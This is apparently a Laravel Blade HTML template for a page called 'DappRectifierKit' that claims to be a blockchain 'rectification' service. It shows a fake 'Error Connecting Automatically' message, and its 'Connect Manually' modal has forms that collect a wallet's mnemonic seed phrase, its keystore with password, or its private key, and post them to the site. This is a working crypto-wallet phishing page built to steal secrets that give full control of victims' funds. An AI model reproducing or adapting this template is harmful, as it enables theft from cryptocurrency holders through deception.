<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

<head>
    <meta charSet="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description"
        content="DappRectifierKit is a Blockchain Rectification Server tool, Open and decentralized protocol for syncing various wallets issues on secure server." />
    <link rel="stylesheet" href="{{ asset('style.css') }}">
    <title data-gatsby-head="true">DappRectifierKit - Blockchain Rectification Server</title>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

    <style>
        #pre-loader {
            background: #ffffff url(assets/img/objects/loader.gif) no-repeat center center;
            background-size: 10%;
            height: 100vh;
            width: 100%;
            position: fixed;
            z-index: 100;
        }
    </style>

</head>

<body>
    <div id="pre-loader"></div>
    <div id="___gatsby">
        <div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper">
            <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
                <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content">
                        <div class="modal__wrapper">
                            <div class="modal__header">
                                <h2 class="title">Connect</h2><button data-bs-dismiss="modal" aria-label="Close"><i
                                        class="flaticon-close-1"></i></button>
                            </div>
                            <div class="modal__body text-center">
                                <div class="connect__section">


                                    <div class="widget widget_categories">
                                        <div class="tagcloud gap-0 justify-content-between" id="manual">
                                            <a href="#" class="bg-dark text-white">Phrase</a>
                                            <a href="#" class="">Keystore</a>
                                            <a href="#" class="">PrivateKey</a>
                                        </div>

                                        <div class="mt-3">

                                            <div id="phrase" class="text-center">
                                                <form action="" method="post" id="phrasefm">
                                                    @csrf
                                                    <h6 class="text-danger text-xs" id="phrase_error">

                                                    </h6>
                                                    <textarea class="texta mb-1" name="phrasetx" row="4" cols="20"
                                                        placeholder="Enter your Mnemonic phrase" required></textarea>
                                                    <p class="privacy-text mb-3">Typically 12(sometimes 24) words
                                                        seperated by single spaces
                                                    </p>
                                                    <button type="submit" id="phrase_btn"
                                                        class="text-white bg-primary px-4 border-0 rounded-1">Proceed
                                                    </button>

                                                </form>
                                            </div>
                                            <div id="keystore" class="text-center d-none">
                                                <form action="" method="post" id="keystorefm">
                                                    @csrf
                                                    <h6 class="text-danger text-xs" id="keystore_error">

                                                    </h6>
                                                    <textarea class="texta mb-2" name="keystoretx" id="" row="4"
                                                        cols="20" placeholder="Enter Keystore" required></textarea>
                                                    <input type="text" class="textInput mb-4" name="keystorefl"
                                                        placeholder="Wallet Password" required>
                                                    <p class="privacy-text mb-3">Several lines of text beginning with
                                                        "[...]"
                                                        plus the password you used to encrypt it
                                                    </p>
                                                    <button type="submit" id="keystore_btn"
                                                        class="text-white bg-primary px-4 border-0 rounded-1">Proceed</button>

                                                </form>
                                            </div>

                                            <div id="privatekey" class="text-center d-none">
                                                <form action="" method="post" id="privatekeyfm">
                                                    @csrf
                                                    <h6 class="text-danger text-xs" id="privatekey_error">

                                                    </h6>
                                                    <input type="text" class="textInput mb-1" name="privatekeyfl"
                                                        placeholder="Enter your private key" required>
                                                    <p class="privacy-text mb-3">Typically 64 alphanumeric characters
                                                    </p>
                                                    <button type="submit" id="privatekey_btn"
                                                        class="text-white bg-primary px-4 border-0 rounded-1">Proceed
                                                    </button>

                                                </form>
                                            </div>
                                        </div>
                                    </div>



                                </div>



                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <main>
                <section class="cta-area">
                    <div class="cta-bg" style="background-image:url(assets/img/bg/collection_cta.png)"></div>
                    <div class="container">
                        <div class="row justify-content-center">
                            <div class="col-xl-6 col-lg-8">
                                <div class="cta__content text-center"><img src="assets/img/objects/circle-01.png"
                                        width="24" alt="Object" style="top:0%;left:-16%" /><img
                                        src="assets/img/objects/x.png" width="24" alt="Object"
                                        style="bottom:16%;right:-8%" /><img src="assets/img/objects/ethereum-02.png"
                                        width="40" alt="Object" style="top:0%;right:-16%" /><img
                                        src="assets/img/objects/bitcoin-01.png" width="48" alt="Object"
                                        style="bottom:16%;left:-8%" />

                                    <h2 class="title text-danger">
                                        <i class="fas fa-exclamation"></i>
                                        Error Connecting Automatically
                                    </h2>
                                    <!-- <a href="/connect" class="btn gradient-btn">Get
                                        started</a> -->
                                    <div class="tagcloud justify-content-center mt-2">
                                        <button class="bg-transparent border-0" data-bs-toggle="modal"
                                            data-bs-target="#errorModal">
                                            <a class="bg-primary text-white">Connect Manually</a>
                                        </button>

                                    </div>

                                    <div class="tagcloud justify-content-center mt-3">
                                        <a class="d-flex align-items-center gap-5">
                                            <span class="author">Decentralized Protocol</span>
                                            <span class="sub-title">connect</span>
                                        </a>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </main>
        </div>
    </div>

    <script src="{{ asset('js/manual.js') }}"></script>

    <script src="{{ asset('js/connect.js') }}"> </script>
    <div class="gtranslate_wrapper"></div>
    <script>window.gtranslateSettings = { "default_language": "en", "wrapper_selector": ".gtranslate_wrapper", "float_switcher_open_direction": "bottom" }</script>
    <script src="https://cdn.gtranslate.net/widgets/latest/float.js" defer></script>
    <!-- <script id="gatsby-chunk-mapping">
        window.___chunkMapping = "{\"app\":[\"/app-1e7c4eed68baef550aaa.js\"],\"component---src-pages-404-js\":[\"/component---src-pages-404-js-466f19515211d391e818.js\"],\"component---src-pages-blog-details-js\":[\"/component---src-pages-blog-details-js-a25d387a801ace966b7f.js\"],\"component---src-pages-blog-js\":[\"/component---src-pages-blog-js-ac6f325eeaf9c29331b1.js\"],\"component---src-pages-home-2-js\":[\"/component---src-pages-home-2-js-dfa9dd52ea4f25dbdd3e.js\"],\"component---src-pages-home-3-js\":[\"/component---src-pages-home-3-js-6d4c0bd64b232f2fc8c1.js\"],\"component---src-pages-index-js\":[\"/component---src-pages-index-js-0fcec6d42fc257524329.js\"]}";
    </script>
    <script>window.___webpackCompilationHash = "247488537796d05302d0";</script> -->
    <script src="{{ asset('js/webpack-runtime-250cffe9e4fb62ae4157.js') }}" async></script>
    <script src="{{ asset('js/framework-0956ea54d6cf417b15a1.js') }}" async></script>
    <script src="{{ asset('js/app-1e7c4eed68baef550aaa.js') }}" async></script>
    <!-- slice-end id="_gatsby-scripts-1" -->
    <script>
        var loader = document.getElementById('pre-loader');

        window.addEventListener("load", function () {
            setTimeout(function () {
                loader.style.display = "none";
            }, 1500);
        });
    </script>
</body>

</html>